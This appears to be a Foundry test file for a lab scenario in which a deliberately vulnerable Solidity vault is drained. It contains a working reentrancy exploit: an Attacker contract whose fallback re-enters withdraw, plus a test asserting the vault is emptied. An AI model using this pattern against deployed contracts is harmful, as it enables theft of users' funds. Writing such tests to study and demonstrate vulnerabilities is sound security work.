// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Script } from 'forge-std/Script.sol';
import { Test, console } from 'forge-std/Test.sol';
import '../contracts/ReentrancyVault.sol';

/**
 * @title ReentrancyVault Test
 * @notice Tests for the ReentrancyVault exploit scenario.
 *         These tests verify the vulnerability exists and demonstrate the attack.
 */
contract ReentrancyVaultTest is Test {
    ReentrancyVault public vault;
    Attacker public attacker;

    uint256 constant VAULT_FUND = 10 ether;
    uint256 constant ATTACK_FUND = 1 ether;

    function setUp() public {
        vault = new ReentrancyVault();
        attacker = new Attacker{value: ATTACK_FUND}(address(vault));

        // Fund the vault
        vm.deal(address(this), VAULT_FUND + 1 ether);
        (bool success,) = address(vault).call{value: VAULT_FUND}("");
        require(success, "Vault funding failed");
    }

    function test_vaultHasCorrectBalance() public {
        assertEq(address(vault).balance, VAULT_FUND);
    }

    function test_vaultDepositWorks() public {
        vault.deposit{value: 1 ether}();
        assertEq(vault.balances(address(this)), 1 ether);
    }

    function test_vaultWithdrawWorks() public {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
        assertEq(vault.balances(address(this)), 0);
    }

    // ── Exploit test ─────────────────────────────────────────────────────────

    function test_reentrancyAttackDrainsVault() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Execute the attack
        attacker.attack(VAULT_FUND);

        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        // Vault should be drained
        assertEq(vaultBalanceAfter, 0);
        // Attacker should have gained at least the vault balance
        assertGt(attackerBalanceAfter, attackerBalanceBefore);
        emit log_named_uint("[EXPLOIT] Vault drained:", vaultBalanceBefore - vaultBalanceAfter);
        emit log_named_uint("[EXPLOIT] Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);
    }

    function test_canary_deployerBalance() public {
        // Sanity check: deployer still has ETH after funding
        assertGt(address(this).balance, 0);
    }
}

/**
 * @title Attacker — Reentrancy exploit contract
 * @notice Executes the reentrancy attack by recursively calling withdraw.
 */
contract Attacker {
    ReentrancyVault public vault;
    bool public isAttacking;

    constructor(address _vault) payable {
        vault = ReentrancyVault(_vault);
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        isAttacking = true;
        vault.withdraw(amount);
        isAttacking = false;
    }

    // Fallback — this is where the reentrancy happens
    receive() external payable {
        if (address(vault).balance >= 1 ether && isAttacking) {
            vault.withdraw(1 ether);
        }
    }
}
